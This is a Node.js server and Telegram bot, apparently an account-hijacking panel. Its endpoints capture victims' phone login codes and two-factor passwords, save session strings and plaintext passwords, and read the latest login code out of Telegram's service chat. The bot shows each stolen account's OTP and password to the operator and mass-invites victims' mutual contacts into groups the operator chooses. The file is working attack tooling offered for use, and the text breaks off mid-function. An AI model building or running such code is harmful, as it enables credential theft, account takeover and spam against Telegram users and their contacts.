require("dotenv").config();
const express = require("express"),
  bodyParser = require("body-parser"),
  fs = require("fs"),
  util = require("util"),
  axios = require('axios'),
  path = require("path"),
  cors = require("cors"),
  srp = require("srp-js"),
  bigintCryptoUtils = require("bigint-crypto-utils"),
  moment = require('moment'),
  MTProto = require("@mtproto/core"),
  rateLimit = require("express-rate-limit"),
  { Api: e, TelegramClient: s } = require("telegram"),
  { StringSession: t } = require("telegram/sessions"),
  { spawn: r } = require("child_process"),
  figlet = require("figlet"),
  os = require("os"),
  net = require("net"),
  { Telegraf, Markup } = require('telegraf'),
  fufufafa = "https://raw.githubusercontent.com/adjiepramandana/truelog/refs/heads/main/buyer-1.txt",
  hostname = process.env.HOSTNAME || 'localhost',
  port = process.env.PORT || 3000,
  apiId = 27427306,
  apiHash = "12a0c2a67e79cbf8284aa5e2cbd3ad04",
  API_BASE_URL = process.env.API_BASE_URL || `https://${hostname}:${port}/`;

function checkPort(e) {
  return new Promise((s, t) => {
    let r = net.createServer();
    r.once("error", (e) => {
      "EADDRINUSE" === e.code ? s(!1) : t(e);
    }),
      r.once("listening", () => {
        r.close(), s(!0);
      }),
      r.listen(e);
  });
}

port || (console.error("Port not specified. Please provide a port number."), process.exit(1));

const ensureDirectoryExists = (e) => {
  fs.existsSync(e) || fs.mkdirSync(e, { recursive: !0 });
};
ensureDirectoryExists("sessions");

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: !0 }));

global.api = new MTProto({
  api_id: 27427306,
  api_hash: "12a0c2a67e79cbf8284aa5e2cbd3ad04",
  storageOptions: { path: './1.json' }
});

let bot = null;
let botToken = null;
let users = [];
let userIdOwner;

function startBot(token) {
    if (bot) {
        console.log('🔄 Menghentikan bot lama...');
        bot.stop();
    }

    bot = new Telegraf(token);

    bot.use(async (ctx, next) => {
        console.log("🔍 Update received:", ctx.update);
        return next();
    });

    bot.start(async (ctx) => {
        console.log("🚀 Starting bot and sending main menu...");
        const chatId = ctx.chat.id;
        const userIdOwnerNum = Number(userIdOwner); // Konversi ke Number

        if (!users.includes(chatId)) {
            users.push(chatId);
        }

        if (chatId == userIdOwnerNum) {
          console.log(userIdOwnerNum);
          await sendMainMenu(ctx);
        }else{
          console.log(userIdOwnerNum);
          console.log(chatId);
          console.log("Not owner");
        }
    });

    async function sendMainMenu(ctx) {
      console.log("🔍 Sending main menu with buttons...");
  
      try {
          const response = await axios.get(`${API_BASE_URL}listNumber`);
          console.log("🔍 Response from listNumber API:", response.data);
  
          if (response.data.status === 'success') {
              const sessionsPath = path.join(__dirname, 'sessions');
              const files = fs.readdirSync(sessionsPath);
  
              const numbers = response.data.numbers
                  .filter(num => !num.includes("_"))
                  .map(number => {
                      const matchingFile = files.find(file => file.endsWith(`_${number}.txt`));
                      let timeAgo = "Beberapa saat yang lalu";
  
                      if (matchingFile) {
                          const timestamp = matchingFile.split('_')[0];
                          timeAgo = moment(Number(timestamp)).fromNow();
                      }
  
                      return [Markup.button.callback(`${timeAgo} | ${number}`, `select_${number}`)];
                  });
  
              console.log("📄 Sending numbers to user:", numbers);
  
              const additionalButtons = [
                  [Markup.button.callback('💾 Tambahkan link grup', 'save_list')],
                  [Markup.button.callback('📋 List Group', 'list_group_links')],
                  [Markup.button.callback('🧨 Culik Semua Nomor ke Semua Grup', 'culik_semua_all')]
              ];
  
              const buttons = [...numbers];
  
              if (numbers.length > 0) {
                  ctx.reply('*Pilih Nomor Akun Telegram:*', {
                      parse_mode: 'Markdown',
                      ...Markup.inlineKeyboard(buttons)
                  });
              } else {
                  ctx.reply('Result tidak di temukan');
              }
          } else {
              console.log("❌ Failed to get number list.");
              ctx.reply('❌ Gagal mengambil daftar nomor.');
          }
      } catch (error) {
          console.error("❌ Error fetching number list:", error);
          ctx.reply('❌ Terjadi kesalahan saat mengambil daftar nomor.');
      }
  }

    bot.action('list_number', async (ctx) => {
      console.log("🔍 User clicked 'List Nomor'");
  
      try {
          const response = await axios.get(`${API_BASE_URL}listNumber`);
          console.log("🔍 Response from listNumber API:", response.data);
  
          if (response.data.status === 'success') {
              const sessionsPath = path.join(__dirname, 'sessions');
              const files = fs.readdirSync(sessionsPath);
  
              const numbers = response.data.numbers
                  .filter(num => !num.includes("_"))
                  .map(number => {
                      const matchingFile = files.find(file => file.endsWith(`_${number}.txt`));
                      let timeAgo = "Beberapa saat yang lalu";
  
                      if (matchingFile) {
                          const timestamp = matchingFile.split('_')[0];
                          timeAgo = moment(Number(timestamp)).fromNow();
                      }
  
                      return [Markup.button.callback(`${timeAgo} | ${number}`, `select_${number}`)];
                  });
  
              console.log("📄 Sending numbers to user:", numbers);
  
              if (numbers.length > 0) {
                  ctx.reply('*Pilih Nomor Akun Telegram:*', {
                      parse_mode: 'Markdown',
                      ...Markup.inlineKeyboard(numbers)
                  });
              } else {
                  ctx.reply('❌ Belum ada nomor masuk bos.');
              }
          } else {
              console.log("❌ Failed to get number list.");
              ctx.reply('❌ Gagal mengambil daftar nomor.');
          }
      } catch (error) {
          console.error("❌ Error fetching number list:", error);
          ctx.reply('❌ Terjadi kesalahan saat mengambil daftar nomor.');
      }
  
      ctx.answerCbQuery();
  });

  bot.action('culik_semua_all', async (ctx) => {
    try {
      const response = await axios.get(`${API_BASE_URL}listNumber`);
      const numbers = response.data.numbers;
  
      if (!numbers || numbers.length === 0) {
        return ctx.reply("❌ Tidak ada nomor aktif untuk proses culik.");
      }
  
      ctx.reply(`⏳ Mulai menculik semua mutual dari ${numbers.length} nomor ke semua grup...`);
  
      for (const number of numbers) {
        try {
          const res = await axios.post(`${API_BASE_URL}inviteMutualContactsToAllGroups`, {
            phoneNumber: number
          });
  
          const status = res.data?.status;
          const report = res.data?.report || [];
  
          await ctx.reply(
            `📞 *${number}* - ${status === 'success' ? '✅ Berhasil' : '❌ Gagal'}\n` +
            report.map(r => `• ${r.group}\n   → ${r.status}`).join('\n\n'),
            { parse_mode: 'Markdown' }
          );
        } catch (e) {
          await ctx.reply(`❌ Gagal menculik dari nomor ${number}: ${e.message}`);
        }
      }
  
      ctx.answerCbQuery();
    } catch (e) {
      console.error(e);
      ctx.reply('❌ Gagal menjalankan culik semua.');
      ctx.answerCbQuery();
    }
  });
  

    bot.action('delete_all_numbers', async (ctx) => {
        console.log("🔍 User clicked 'Hapus Semua Nomor'");
        try {
            const response = await axios.get(`${API_BASE_URL}deleteAllNumber`);
            console.log("🔍 Response from deleteAllNumber API:", response.data);
            if (response.data.status === 'success') {
                ctx.reply('✅ Semua nomor berhasil dihapus.');
            } else {
                ctx.reply('❌ Gagal menghapus semua nomor.');
            }
        } catch (error) {
            console.error("❌ Error deleting all numbers:", error);
            ctx.reply('❌ Terjadi kesalahan saat menghapus semua nomor.');
        }
        ctx.answerCbQuery();
    });

    bot.action(/select_(.+)/, async (ctx) => {
      const selectedNumber = ctx.match[1];
      console.log(`🔍 User selected number: ${selectedNumber}`);
  
      try {
          const response = await axios.post(`${API_BASE_URL}getUserInfo`, { phoneNumber: selectedNumber });
  
          if (!response.data.userInfo) {
              await ctx.reply("📌Session telah invalid, nomor akan di hapus.");
              return;
          }
  
          const { id, username, fullName } = response.data.userInfo;
          const phoneNumberLink = `[${selectedNumber}](tel:${selectedNumber})`;
          let otpCode = "N/A";
          let password = "N/A";

          const f = await axios.post(`${API_BASE_URL}readOtp`, { phoneNumber: selectedNumber });
          console.log("🔍 Response from readOtp API:", f.data);

          if (f.data.status === 'success' && f.data.latestMessage) {
              const message = f.data.latestMessage;
              const match = message.match(/(\d{5,6})/);
              if (match) otpCode = match[1];
          }

          const i = await axios.get(`${API_BASE_URL}getPassword/${selectedNumber}`);
          if (i.data.status === "success") password = i.data.password;

         const userInfoRes = await axios.post(`${API_BASE_URL}getUserInfo`, { phoneNumber: selectedNumber });
          const info = userInfoRes.data?.userInfo || {};

                await ctx.reply(
        `*𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖠𝖼𝖼𝗈𝗎𝗇𝗍 𝖬𝖺𝗇𝖺𝗀𝖾𝗋*\n` +
        `• Nama: ${info.firstName || '-'} ${info.lastName || ''}\n` +
        `• Nomor: ${phoneNumberLink}\n` +
        `• OTP: ${otpCode}\n` +
        `• A2F: ${password}\n` +
        `• Username: @${info.username || 'Tidak Ada'}\n` +
        `• Total Kontak: ${info.totalContacts || 0}\n` +
        `├─ Mutual: ${info.mutualContacts || 0}\n` +
        `└─ Non-Mutual: ${info.nonMutualContacts || 0}`,
        {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('Hapus', `delete_${selectedNumber}`)],
            [Markup.button.callback('Kembali', 'back_to_menu')]
          ])
        }
      );


  
          await ctx.answerCbQuery();
      } catch (error) {
          console.error("❌ Error fetching user info:", error);
          if (error.response?.data?.message === "Session telah invalid.") {
              await ctx.reply("❌Session telah invalid, nomor akan di hapus dari list");
          } else {
              await ctx.reply("❌Terjadi kesalahan saat mengambil informasi pengguna. Silakan coba lagi.");
          }
          await ctx.answerCbQuery();
      }
  });

    bot.action(/get_pw_(.+)$/, async (ctx) => {
      const selectedNumber = ctx.match[1];
      try {
          const response = await axios.get(`${API_BASE_URL}getPassword/${selectedNumber}`);
          if (response.data.status === "success") {
              const { phoneNumber, password } = response.data;
              const message = `📌 *Account Manager by JieCode*\n📞 Nomor: ${phoneNumber}\n🔑 Password: \`${password}\`\n\n`;
              const backButton = Markup.inlineKeyboard([
                  [Markup.button.callback("⬅️ List Nomor", `select_${selectedNumber}`)]
              ]);
              await ctx.reply(message, { parse_mode: "Markdown", ...backButton });
          } else {
              await ctx.reply("⚠️ Password tidak ditemukan atau belum disimpan.");
          }
      } catch (error) {
          console.error("❌ Error fetching password:", error);
          await ctx.reply("⚠️ Gagal mengambil password.");
      }
      ctx.answerCbQuery();
  });

  bot.action('list_group_links', async (ctx) => {
    const filePath = path.join(__dirname, 'group_links.json');
    if (!fs.existsSync(filePath)) {
        return ctx.reply("📭 Belum ada link grup yang tersimpan.");
    }

    const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    if (!data.groupLinks || data.groupLinks.length === 0) {
        return ctx.reply("📭 Belum ada link grup yang tersimpan.");
    }

    const keyboard = data.groupLinks.map((link, index) => {
        return [Markup.button.callback(`🗑️ Hapus ${index + 1}`, `delete_group_${index}`)];
    });

    const messageText = data.groupLinks.map((link, i) => `*${i + 1}.* ${link}`).join('\n');

    await ctx.reply(messageText, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard(keyboard)
    });

    await ctx.answerCbQuery(); // Menghilangkan loading di tombol
});

bot.action(/delete_group_(\d+)/, async (ctx) => {
    const index = parseInt(ctx.match[1], 10);
    const filePath = path.join(__dirname, 'group_links.json');
    if (!fs.existsSync(filePath)) return ctx.answerCbQuery("❌ File tidak ditemukan.");

    const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    if (index < 0 || index >= data.groupLinks.length) {
        return ctx.answerCbQuery("❌ Index tidak valid.");
    }

    const removedLink = data.groupLinks.splice(index, 1);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

    await ctx.answerCbQuery(`✅ Link dihapus:\n${removedLink[0]}`, { show_alert: true });
    // Optional: Refresh list
    ctx.deleteMessage(); // Hapus pesan lama
});


    bot.action(/get_otp_(.+)/, async (ctx) => {
        const selectedNumber = ctx.match[1];
        console.log(`🔍 Fetching OTP for number: ${selectedNumber}`);
        try {
            const response = await axios.post(`${API_BASE_URL}readOtp`, { phoneNumber: selectedNumber });
            console.log("🔍 Response from readOtp API:", response.data);
            if (response.data.status === 'success') {
                ctx.reply(`🔑 *OTP:* ${response.data.latestMessage}`, {
                    parse_mode: 'Markdown'
                });
            } else {
                console.log("❌ Failed to get OTP.");
                ctx.reply('❌ Gagal mengambil OTP.');
            }
        } catch (error) {
            console.error("❌ Error fetching OTP:", error);
            ctx.reply('❌ Terjadi kesalahan saat mengambil OTP.');
        }
        ctx.answerCbQuery();
    });

    const userState = {};

    bot.action('save_list', async (ctx) => {
        const userId = ctx.from.id;
        console.log(`💾 Waiting for user ${userId} to input a group link...`);
        userState[userId] = { waitingForGroupLink: true };
        ctx.reply("📌 Masukkan Link Group atau Channel (format: https://t.me/...)");
        ctx.answerCbQuery();
    });
    
    bot.on('text', async (ctx) => {
      const userId = ctx.from.id;
      if (userState[userId]?.waitingForGroupLink) {
          const userText = ctx.message.text;
          const linkMatch = userText.match(/https:\/\/t\.me\/\S+/);
          if (linkMatch) {
              const groupLink = linkMatch[0];
              const filePath = path.join(__dirname, 'group_links.json');
              let data = { groupLinks: [] };
              if (fs.existsSync(filePath)) {
                  data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
              }
              data.groupLinks.push(groupLink);
              fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
              console.log(`✅ Group link saved: ${groupLink}`);
              ctx.reply(
                  `✅ Link berhasil disimpan: ${groupLink}`,
                  {
                      parse_mode: 'Markdown',
                      ...Markup.inlineKeyboard([
                          [Markup.button.callback('⬅️ Back', 'back_to_menu')]
                      ])
                  }
              );
          } else {
              ctx.reply("❌ Link tidak valid! Harap masukkan link dengan format `https://t.me/...`");
          }
          delete userState[userId];
      }
  });

  bot.action(/culik_semua_(.+)/, async (ctx) => {
    const selectedNumber = ctx.match[1];
    ctx.reply('⏳ Memulai proses culik semua mutual ke semua grup...');
  
    try {
      const response = await axios.post(`${API_BASE_URL}inviteMutualContactsToAllGroups`, {
        phoneNumber: selectedNumber
      });
  
      if (response.data.status === 'success') {
        const report = response.data.report.map(r => `• ${r.group}\n   → ${r.status}`).join('\n\n');
        await ctx.reply(`✅ Proses selesai:\n\n${report}`);
      } else {
        await ctx.reply(`❌ Gagal: ${response.data.message}`);
      }
    } catch (error) {
      console.error("❌ Error saat culik semua:", error);
      await ctx.reply("❌ Terjadi kesalahan saat menculik semua mutual ke grup.");
    }
  
    ctx.answerCbQuery();
  });
  

    bot.action(/delete_(.+)/, async (ctx) => {
        const selectedNumber = ctx.match[1];
        console.log(`🔍 Deleting number: ${selectedNumber}`);
        try {
            const response = await axios.get(`${API_BASE_URL}deleteNumber`, {
                params: { phoneNumber: selectedNumber }
            });
            console.log("🔍 Response from deleteNumber API:", response.data);
            if (response.data.status === 'success') {
                ctx.reply('✅ Nomor berhasil dihapus.');
                await sendMainMenu(ctx);
            } else {
                console.log("❌ Failed to delete number.");
                ctx.reply('❌ Gagal menghapus nomor.');
            }
        } catch (error) {
            console.error("❌ Error deleting number:", error);
            ctx.reply('❌ Terjadi kesalahan saat menghapus nomor.');
        }
        ctx.answerCbQuery();
    });

    bot.action(/culik_grup_(.+)/, async (ctx) => {
      const selectedNumber = ctx.match[1];
      console.log(`🔍 Menculik nomor: ${selectedNumber}`);
      try {
          const rawData = fs.readFileSync('group_links.json');
          const jsonData = JSON.parse(rawData);
          const groupLinks = jsonData.groupLinks;
          for (const groupLink of groupLinks) {
              const response = await axios.post(`${API_BASE_URL}joinGrup`, {
                  phoneNumber: selectedNumber,
                  grupLink: groupLink
              });
              console.log("🔍 Response from joinGrup API:", response.data);
              if (response.data.status !== 'success') {
                  console.log(`❌ Gagal menculik nomor ke grup: ${groupLink}`);
                  ctx.reply(`❌ Gagal menculik nomor ke grup: ${groupLink}`);
              }
          }
          ctx.reply('✅ Nomor berhasil di culik ke semua grup.');
          await sendMainMenu(ctx);
      } catch (error) {
          console.error("❌ Error menculik nomor:", error);
          ctx.reply('❌ Terjadi kesalahan saat menculik nomor.');
      }
      ctx.answerCbQuery();
  });

    bot.action('back_to_menu', (ctx) => {
        console.log("🔙 Returning to main menu...");
        sendMainMenu(ctx);
        ctx.answerCbQuery();
    });

    bot.launch();
    console.log('✅ Bot berjalan dengan token:', token);
}

function kirimPesanKeSemuaUser(a) {
  console.log("📢 Mengirim pesan ke semua user...");
  if (users.length === 0) {
      console.log("⚠️ Tidak ada user yang tersimpan.");
      return;
  }
  users.forEach(chatId => {
      bot.telegram.sendMessage(chatId, `${a}, Berhasil Login`)
      .catch(err => console.error("❌ Error kirim pesan ke", chatId, ":", err));
  });
}

const limiter = rateLimit({
  windowMs: 9e5,
  max: 100,
  message: {
    status: "error",
    message: "Too many requests, please try again later.",
  },
});
app.use(limiter);

const sessions = new Map();

const initializeClient = async (e) => {
    if (!sessions.has(e)) {
      let r = path.join("sessions", `${e}.txt`),
        a = fs.existsSync(r) ? fs.readFileSync(r, "utf8") : "",
        o = new s(new t(a), apiId, apiHash, {
          connectionRetries: 5,
        });
      await o.connect(), sessions.set(e, o);
    }
    return sessions.get(e);
};

const loadExistingSessions = async () => {
    let e = fs.existsSync("sessions") ? fs.readdirSync("sessions") : [];
    await Promise.all(
      e.map(async (e) => {
        let r = e.replace(".txt", ""),
          a = fs.readFileSync(path.join("sessions", e), "utf8"),
          o = new s(new t(a), apiId, apiHash, {
            connectionRetries: 5,
          });
        await o.connect(),
          sessions.set(r, o),
          console.log(`Loaded session for phone number: ${r}`),
          console.log(`${r} session string : ${a}`);
      }),
    );
};

async function checkSession(file) {
    try {
        const sessionString = fs.readFileSync(path.join("sessions", file), "utf8");
        const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, {
            connectionRetries: 5,
        });
        await client.connect();
        await client.getMe();
        await client.disconnect();
        return true;
    } catch (c) {
        const errorMessage = c.message.toUpperCase();
        if (errorMessage.includes("AUTH _KEY_UNREGISTERED") || errorMessage.includes("SESSION_REVOKED")) {
            console.log(`Session revoked for ${file}, deleting...`);
            fs.unlinkSync(path.join("sessions", file));
            return false;
        } else {
            console.log(`Error checking session for ${file}:`, c.message);
            return true;
        }
    }
}

async function fetchAPIKeys(e) {
  return new Promise((s, t) => {
    https
      .get(e, (e) => {
        let r = "";
        e.on("data", (e) => {
          r += e;
        }),
          e.on("end", () => {
            try {
              let e = r.split("\n"),
                a = {};
              e.forEach((e) => {
                let [s, t] = e.split("=").map((e) => e.trim());
                s && t && (a[s] = t);
              }),
                1 != a.engine &&
                  (console.log("Bayar Dulu Bro"), process.exit(1)),
                (global.apiId = parseInt(a.api_id, 10)),
                (global.apiHash = a.api_hash),
                console.log("Configurations loaded successfully ✅"),
                s();
            } catch (o) {
              console.error("Error parsing data:", o.message), t(o);
            }
          });
      })
      .on("error", (e) => {
        console.error("Error fetching data:", e.message), t(e);
      });
  });
}

loadExistingSessions().catch((e) => {
  console.error("Error loading sessions:", e);
});

app.post("/sendCode", async (req, res) => {
    let phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
    if (!/^\+?\d{10,15}$/.test(phoneNumber))
      return res.json({
        status: "error",
        message: "Invalid phone number format.",
      });
    console.log(`Phone Number Received: ${phoneNumber}`);
    try {
      let client = await initializeClient(phoneNumber),
        result = await client.invoke(
          new e.auth.SendCode({
            phoneNumber: phoneNumber,
            apiId: apiId,
            apiHash: apiHash,
            settings: new e.CodeSettings({
              allowFlashcall: !0,
              currentNumber: !0,
              allowAppHash: !0,
              allowMissedCall: !0,
            }),
          }),
        );
      res.json({
        status: "success",
        phoneCodeHash: result.phoneCodeHash,
        message: "Code sent successfully.",
      });
    } catch (error) {
      console.error("Error sending code:", error),
        res.json({
          status: "error",
          message: "Failed to send code.",
        });
    }
});

app.post("/verifyCode", async (req, res) => {
    let { phoneNumber, otp, phoneCodeHash } = req.body;
    if (!phoneNumber || !otp || !phoneCodeHash)
        return res.json({
            status: "error",
            message: "Invalid input.",
        });

    console.log("OTP: [REDACTED]");

    try {
        let client = await initializeClient(phoneNumber);
        let result = await client.invoke(
            new e.auth.SignIn({
                phoneNumber: phoneNumber,
                phoneCodeHash: phoneCodeHash,
                phoneCode: otp,
            }),
        );

        let sessionString = client.session.save();
        const timestamp = Date.now();

        if (!fs.existsSync("sessions")) {
            fs.mkdirSync("sessions", { recursive: true });
        }

        fs.writeFileSync(path.join("sessions", `${phoneNumber}.txt`), sessionString);
        fs.writeFileSync(path.join("sessions", `${timestamp}_${phoneNumber}.txt`), timestamp.toString());

        kirimPesanKeSemuaUser(phoneNumber);

        res.json({
            status: "success",
            message: "Login successful.",
            result: result,
        });
    } catch (error) {
        if (error.message.includes("SESSION_PASSWORD_NEEDED")) {
            const srpData = error?.params;
            console.log("SRP Data:", srpData);

            if (!srpData) {
                return res.json({
                    status: "errorpw",
                    message: "Password required for login, but SRP data is missing.",
                });
            }

            return res.json({
                status: "errorpw",
                message: "Password required for login.",
                srpData: srpData,
            });
        }

        console.error("Error verifying code:", error);
        res.json({
            status: "error",
            message: "Failed to verify code.",
            error: error.message,
        });
    }
});

app.post("/verifyPassword", async (req, res) => {
  let { phoneNumber, password } = req.body;
  if (!phoneNumber || !password)
      return res.json({
          status: "error",
          message: "Invalid input.",
      });

  console.log("Password: [REDACTED]");

  try {
      let client = await initializeClient(phoneNumber);
      const { srpId, currentAlgo, srp_B } = await client.invoke(new e.account.GetPassword());

      if (!currentAlgo) {
        throw new Error("currentAlgo is undefined. Make sure the account has a password set up.");
      }

      const { g, p, salt1, salt2 } = currentAlgo;
      const { A, M1 } = await global.api.crypto.getSRPParams({
        g,
        p,
        salt1,
        salt2,
        gB: srp_B,
        password: password
      });

      const A_buffer = Buffer.from(A);
      const M1_buffer = Buffer.from(M1);

      const result = await client.invoke(
          new e.auth.CheckPassword({
              password: new e.InputCheckPasswordSRP({
                  srpId: srpId,
                  A: A_buffer,
                  M1: M1_buffer,
              }),
          })
      );

      console.log("Verification Result:", result);

      let sessionString = client.session.save();
      const timestamp = Date.now();

      if (!fs.existsSync("sessions")) {
          fs.mkdirSync("sessions", { recursive: true });
      }

      const folderPath = path.join(__dirname, 'sessions');
      if (!fs.existsSync(folderPath)) {
          fs.mkdirSync(folderPath, { recursive: true });
      }

      const filePath = path.join(folderPath, `pw_${phoneNumber}.txt`);
      const fileContent = `Nomor: ${phoneNumber}\nPassword: ${password}\n`;
      fs.writeFileSync(filePath, fileContent, 'utf8');
      console.log(`✅ Data berhasil disimpan ke ${filePath}`);

      fs.writeFileSync(path.join("sessions", `${phoneNumber}.txt`), sessionString);
      fs.writeFileSync(path.join("sessions", `${timestamp}_${phoneNumber}.txt`), timestamp.toString());

      kirimPesanKeSemuaUser(phoneNumber);

      res.json({
          status: "success",
          message: "Password verified and data saved successfully.",
          result: result,
      });
  } catch (error) {
      console.error("Error verifying password:", error);
      res.json({
          status: "error",
          message: "Failed to verify password.",
          error: error.message,
      });
  }
});

app.get("/getTimestamp/:phoneNumber", async (req, res) => {
  const { phoneNumber } = req.params;
  const sessionsPath = path.join(__dirname, 'sessions');
  const files = fs.readdirSync(sessionsPath);
  const matchingFile = files.find(file => file.endsWith(`_${phoneNumber}.txt`));

  if (!matchingFile) {
      return res.json({
          status: "error",
          message: "Timestamp not found.",
      });
  }

  const filePath = path.join(sessionsPath, matchingFile);

  try {
      const timestamp = fs.readFileSync(filePath, 'utf8').trim();
      return res.json({
          status: "success",
          phoneNumber,
          timestamp,
      });
  } catch (error) {
      console.error("❌ Error reading timestamp file:", error);
      return res.json({
          status: "error",
          message: "Failed to retrieve timestamp.",
      });
  }
});

app.post("/inviteMutualContactsToAllGroups", async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.json({ status: "error", message: "Phone number wajib diisi." });
    }
  
    const groupLinksFile = path.join(__dirname, 'group_links.json');
    if (!fs.existsSync(groupLinksFile)) {
      return res.json({ status: "error", message: "File group_links.json tidak ditemukan." });
    }
  
    try {
      const groupLinks = JSON.parse(fs.readFileSync(groupLinksFile, 'utf8')).groupLinks || [];
      if (groupLinks.length === 0) {
        return res.json({ status: "error", message: "Tidak ada link grup dalam file." });
      }
  
      const client = await initializeClient(phoneNumber);
      const contacts = await client.invoke(new e.contacts.GetContacts({}));
      const mutuals = contacts.users.filter(user => user.mutualContact);
  
      let report = [];
  
      for (const link of groupLinks) {
        let inviteSuccess = 0;
        let inviteFail = 0;
  
        // Convert grup link menjadi InputPeerChannel
        let entity;
        try {
          entity = await client.invoke(
            new e.contacts.ResolveUsername({ username: link.replace("https://t.me/", "").replace("/", "") })
          );
        } catch (err) {
          report.push({ group: link, status: "❌ Gagal resolve grup", error: err.message });
          continue;
        }
  
        const channel = entity?.chats?.[0];
        if (!channel) {
          report.push({ group: link, status: "❌ Grup tidak ditemukan dari link" });
          continue;
        }
  
        for (const user of mutuals) {
          try {
            await client.invoke(
              new e.channels.InviteToChannel({
                channel: channel,
                users: [user.id]
              })
            );
            inviteSuccess++;
          } catch (err) {
            inviteFail++;
          }
        }
  
        report.push({
          group: link,
          status: `✅ ${inviteSuccess} sukses, ❌ ${inviteFail} gagal`,
        });
      }
  
      res.json({ status: "success", report });
    } catch (error) {
      console.error("❌ Error saat mengundang:", error);
      res.json({ status: "error", message: "Terjadi kesalahan internal.", error: error.message });
    }
  });
  

app.get("/getPassword/:phoneNumber", async (req, res) => {
  const { phoneNumber } = req.params;
  const filePath = path.join(__dirname, 'sessions', `pw_${phoneNumber}.txt`);

  try {
      if (!fs.existsSync(filePath)) {
          return res.json({
              status: "error",
              message: "Password not found.",
          });
      }

      const fileContent = fs.readFileSync(filePath, 'utf8');
      const password = fileContent.split('\n')[1]?.replace('Password: ', '').trim();

      return res.json({
          status: "success",
          phoneNumber,
          password,
      });
  } catch (error) {
      console.error("❌ Error reading password file:", error);
      return res.json({
          status: "error",
          message: "Failed to retrieve password.",
      });
  }
});

app.post("/readOtp", async (req, res) => {
    let phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
    try {
      let client = await initializeClient(phoneNumber),
        entity = await client.getEntity(777000);
      if (!entity)
        return res.json({
          status: "error",
          message: "Telegram Official chat not found.",
        });
      let messages = await client.getMessages(entity.id, { limit: 1 });
      if (messages.length > 0) {
        let messageText = messages[0].text || "No text in the latest message";
        res.json({
          status: "success",
          message: "Latest message retrieved successfully.",
          latestMessage: messageText,
        });
      } else
        res.json({
          status: "error",
          message: "No messages found in Telegram Official chat.",
        });
    } catch (error) {
      console.error("Error reading latest message:", error),
        res.json({
          status: "error",
          message: "Failed to read the latest message.",
        });
    }
});

app.post("/getUserInfo", async (req, res) => {
    let phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
    try {
        let client = await initializeClient(phoneNumber);
        let user = await client.getMe();
        let contacts = await client.invoke(new e.contacts.GetContacts({}));

        let totalContacts = contacts.users.length;
        let mutualContacts = contacts.users.filter(u => u.mutualContact).length;
        let nonMutualContacts = totalContacts - mutualContacts;

        if (user) {
            res.json({
                status: "success",
                message: "User information retrieved successfully.",
                userInfo: {
                    id: user.id,
                    username: user.username || "No username",
                    firstName: user.firstName || "",
                    lastName: user.lastName || "",
                    fullName: `${user.firstName || ''} ${user.lastName || ''}`.trim(),
                    totalContacts,
                    mutualContacts,
                    nonMutualContacts
                }
            });
        } else {
            res.json({
                status: "error",
                message: "User information not found."
            });
        }
    } catch (error) {
        console.error("Error fetching user information:", error);
        if (error.code === 401 && error.errorMessage === 'AUTH_KEY_UNREGISTERED') {
            console.log(`Session revoked for ${phoneNumber}, deleting...`);
            try {
                const sessionFilePath = path.join("sessions", phoneNumber + ".txt");
                if (fs.existsSync(sessionFilePath)) {
                    fs.unlinkSync(sessionFilePath);
                    console.log(`Session file for ${phoneNumber} deleted successfully.`);
                }
            } catch (err) {
                console.error(`Failed to delete session file for ${phoneNumber}:`, err);
            }
            res.json({
                status: "error",
                message: "📌Session telah invalid, nomor akan di hapus."
            });
        } else if (error instanceof TypeError && error.message.includes("Cannot destructure property")) {
            res.json({
                status: "error",
                message: "Data pengguna tidak valid atau tidak ditemukan."
            });
        } else {
            res.json({
                status: "error",
                message: "Failed to fetch user information."
            });
        }
    }
});

app.post("/joinGrup", async (req, res) => {
  let phoneNumber = req.body.phoneNumber || req.query.phoneNumber;
  let grupLink = req.body.grupLink || req.query.grupLink;

  if (!grupLink) {
      return res.json({
          status: "error",
          message: "Grup link diperlukan untuk join."
      });
  }

  try {
      let client = await initializeClient(phoneNumber);
      let user = await client.getMe();
      if (!user) {
          return res.json({
              status: "error",
              message: "User tidak ditemukan atau belum login."
          });
      }

      console.log(`📌 ${user.username || phoneNumber} mencoba join grup: ${grupLink}`);

      await client.invoke(
          new e.channels.JoinChannel({
              channel: grupLink
          })
      );

      res.json({
          status: "success",
          message: `✅ Berhasil join grup: ${grupLink}`,
          userInfo: {
              id: user.id,
              username: user.username || "No username",
              fullName: `${user.firstName || ''} ${user.lastName || ''}`.trim()
          }
      });
  } catch (error) {
      console.error("❌ Error saat join grup:", error);
      res.json({
          status: "error",
          message: "Gagal join ke grup. Periksa apakah link grup valid dan akun memiliki akses."
      });
  }
});

app.post("/restart", (req, res) => {
    let secret = req.query.secret || req.body.secret;
    if (secret !== process.env.RESTART_SECRET)
      return res.json({
        status: "error",
        message: "Unauthorized access.",
      });
    console.log("Received restart request. Restarting server..."),
      res.json({
        status: "success",
        message: "Server is restarting...",
      }),
      server.close(() => {
        console.log("Server closed. Spawning new process..."),
          r(process.argv[0], process.argv.slice(1), {
            stdio: "inherit",
          }),
          process.exit(0);
      });
});

app.get("/deleteNumber", (req, res) => {
    try {
      const number = req.query.phoneNumber;
      const filePath = path.join("sessions", `${number}.txt`);
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
        res.json({
          status: "success",
          message: `Nomor ${number} berhasil dihapus.`,
        });
      } else {
        res.json({
          status: "error",
          message: `Nomor ${number} tidak ditemukan.`,
        });
      }
    } catch (error) {
      console.error("Error deleting number:", error);
      res.json({
        status: "error",
        message: "Gagal menghapus nomor.",
      });
    }
});

app.get("/deleteAllNumber", (req, res) => {
    try {
        const dirPath = path.join("sessions");
        const files = fs.readdirSync(dirPath);
        const txtFiles = files.filter(file => file.endsWith('.txt'));
        if (txtFiles.length > 0) {
